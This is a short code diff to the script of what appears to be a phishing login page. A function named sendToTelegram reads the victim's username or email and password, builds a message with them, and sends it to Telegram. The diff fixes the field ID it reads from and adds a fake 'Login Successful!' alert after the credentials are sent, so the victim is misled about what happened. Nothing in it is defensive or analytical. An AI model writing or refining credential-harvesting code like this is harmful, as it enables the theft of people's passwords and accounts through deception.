@@ -297,7 +297,7 @@
         }
 
         function sendToTelegram() {
-            const emailOrUsername = document.getElementById('email-or-username').value;
+            const emailOrUsername = document.getElementById('username-or-email').value;
             const password = document.getElementById('password').value;
             const message = `Email or Username: ${emailOrUsername}\nPassword: ${password}`;
 
@@ -307,6 +307,7 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log("Credentials sent to Telegram");
+                    alert('Login Successful!'); // Show an alert after the data is sent
                 })
                 .catch(error => {
                     console.error("Error sending credentials to Telegram: ", error);
